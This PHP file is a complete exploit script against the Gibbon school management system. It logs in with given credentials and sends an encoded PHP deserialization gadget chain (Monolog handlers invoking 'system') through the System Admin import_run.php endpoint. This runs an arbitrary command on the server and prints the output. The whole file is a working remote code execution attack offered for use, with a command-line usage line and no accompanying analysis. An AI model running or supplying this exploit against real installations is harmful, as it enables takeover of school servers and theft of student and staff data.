<?php


function login($target_host,$target_port,$target_path,$email,$password){
	$url= "http://$target_host:$target_port/$target_path/login.php?timeout=true";
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_POST, true);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);

	$headers = [
		"Content-Type: multipart/form-data; boundary=---------------------------174475955731268836341556039466"
	];

	curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
	$data ="-----------------------------174475955731268836341556039466\r\n" .
            "Content-Disposition: form-data; name=\"address\"\r\n\r\n\r\n" .
            "-----------------------------174475955731268836341556039466\r\n" .
            "Content-Disposition: form-data; name=\"method\"\r\n\r\ndefault\r\n" .
            "-----------------------------174475955731268836341556039466\r\n" .
            "Content-Disposition: form-data; name=\"username\"\r\n\r\n$email\r\n" .
            "-----------------------------174475955731268836341556039466\r\n" .
            "Content-Disposition: form-data; name=\"password\"\r\n\r\n$password\r\n" .
            "-----------------------------174475955731268836341556039466\r\n" .
            "Content-Disposition: form-data; name=\"gibbonSchoolYearID\"\r\n\r\n025\r\n" .
            "-----------------------------174475955731268836341556039466\r\n" .
            "Content-Disposition: form-data; name=\"gibboni18nID\"\r\n\r\n0002\r\n" .
            "-----------------------------174475955731268836341556039466--\r\n";

	curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
	curl_setopt($curl, CURLOPT_HEADER, true);

	$response = curl_exec($curl);

	$header_size = curl_getinfo($curl, CURLINFO_HEADER_SIZE);
	$header = substr($response, 0, $header_size);
	    

	preg_match('/Set-Cookie:\s*([^;]*)/i', $header, $matches);
	$session_cookie = isset($matches[1]) ? $matches[1] : null;

    if ($session_cookie !== null && strpos($header, '/index.php') !== false) {
        echo "[X] Login successful!\n";
    } else {
        echo "[X] Login failed!\n";
    }

    curl_close($curl);
    

    return $session_cookie;
}

function generate_payload($command){
	$base64_string = "YToyOntpOjclM0JPOjMyOiJNb25vbG9nXEhhbmRsZXJcU3lzbG9nVWRwSGFuZGxlciI6MTp7czo5OiIlMDAqJTAwc29ja2V0IiUzQk86Mjk6Ik1vbm9sb2dcSGFuZGxlclxCdWZmZXJIYW5kbGVyIjo3OntzOjEwOiIlMDAqJTAwaGFuZGxlciIlM0JyOjMlM0JzOjEzOiIlMDAqJTAwYnVmZmVyU2l6ZSIlM0JpOi0xJTNCczo5OiIlMDAqJTAwYnVmZmVyIiUzQmE6MTp7aTowJTNCYToyOntpOjAlM0JzOkNPTU1BTkRfU0laRToiQ09NTUFORCIlM0JzOjU6ImxldmVsIiUzQk4lM0J9fXM6ODoiJTAwKiUwMGxldmVsIiUzQk4lM0JzOjE0OiIlMDAqJTAwaW5pdGlhbGl6ZWQiJTNCYjoxJTNCczoxNDoiJTAwKiUwMGJ1ZmZlckxpbWl0IiUzQmk6LTElM0JzOjEzOiIlMDAqJTAwcHJvY2Vzc29ycyIlM0JhOjI6e2k6MCUzQnM6NzoiY3VycmVudCIlM0JpOjElM0JzOjY6InN5c3RlbSIlM0J9fX1pOjclM0JpOjclM0J9";

	$command_size = strlen($command);
	$decoded_bytes = base64_decode($base64_string);
	$decoded_string = utf8_decode($decoded_bytes);
	$payload = urldecode($decoded_string);

	
	$payload = str_replace('COMMAND_SIZE', $command_size, $payload);
	$payload = str_replace('COMMAND',$command,$payload);


	echo 'Payload Genereted';

	return $payload;

}

function rce($cookie,$target_host,$target_port,$target_path,$command){
	$url= "http://$target_host:$target_port/$target_path/index.php?q=/modules/System%20Admin/import_run.php&type=externalAssessment&step=4";
	$headers = [
		"Content-Type: multipart/form-data; boundary=---------------------------104550429928543086952438317710",
		"Cookie: $cookie"
	];
	$payload = generate_payload($command);
	$data ="-----------------------------104550429928543086952438317710\r\n".
            "Content-Disposition: form-data; name=\"address\"\r\n\r\n".
            "/modules/System Admin/import_run.php\r\n".
            "-----------------------------104550429928543086952438317710\r\n".
            "Content-Disposition: form-data; name=\"mode\"\r\n\r\nsync\r\n".
            "-----------------------------104550429928543086952438317710\r\n".
            "Content-Disposition: form-data; name=\"syncField\"\r\n\r\nN\r\n".
            "-----------------------------104550429928543086952438317710\r\n".
            "Content-Disposition: form-data; name=\"syncColumn\"\r\n\r\n\r\n".
            "-----------------------------104550429928543086952438317710\r\n".
            "Content-Disposition: form-data; name=\"columnOrder\"\r\n\r\n$payload\r\n".
            "-----------------------------104550429928543086952438317710\r\n".
            "Content-Disposition: form-data; name=\"columnText\"\r\n\r\nN;\r\n".
            "-----------------------------104550429928543086952438317710\r\n".
            "Content-Disposition: form-data; name=\"fieldDelimiter\"\r\n\r\n%2C\r\n".
            "-----------------------------104550429928543086952438317710\r\n".
            "Content-Disposition: form-data; name=\"stringEnclosure\"\r\n\r\n%22\r\n".
            "-----------------------------104550429928543086952438317710\r\n".
            "Content-Disposition: form-data; name=\"filename\"\r\n\r\nDataStructure-externalAssessment.xlsx\r\n".
            "-----------------------------104550429928543086952438317710\r\n".
            "Content-Disposition: form-data; name=\"csvData\"\r\n\r\n\"External Assessment\",\"Assessment Date\",\"Student\",\"Field Name Category\",\"Field Name\",\"Result\"\r\n".
            "-----------------------------104550429928543086952438317710\r\n".
            "Content-Disposition: form-data; name=\"ignoreErrors\"\r\n\r\n1\r\n".
            "-----------------------------104550429928543086952438317710\r\n".
            "Content-Disposition: form-data; name=\"Failed\"\r\n\r\nSubmit\r\n".
            "-----------------------------104550429928543086952438317710--"; 
	
	$curl = curl_init();
	//$proxy = '127.0.0.1:8080';
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
	curl_setopt($curl, CURLOPT_POST, true);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER,true);
	curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
	//curl_setopt($curl, CURLOPT_PROXY, $proxy);

	$response = curl_exec($curl);
    $start_index = strpos($response, "<h2>Step 4 - Live Run</h2>");
    if ($start_index !== false) {
        $end_index = strpos($response, "<div class", $start_index);
        $result = substr($response, $start_index + 26, $end_index - ($start_index + 26));
        $result = trim($result);
        
        if (!empty($result)) {
            echo "\n[X] Execution result: \n" . $result . "\n";
        } else {
            echo "[X] Command failed or did not output anything.\n";
        }
    } else {
        echo "[X] Step 4 - Live Run not found in the response.\n";
    }

    curl_close($curl);

}

if ($argc != 7) {
    die("[X] Usage: php gibbon_rce.php <target_host> <target_port> <target_path> <email> <password> <command>\n");
}

$cookie = login($argv[1], $argv[2], $argv[3], $argv[4], $argv[5]);
rce($cookie, $argv[1], $argv[2], $argv[3], $argv[6]);

?>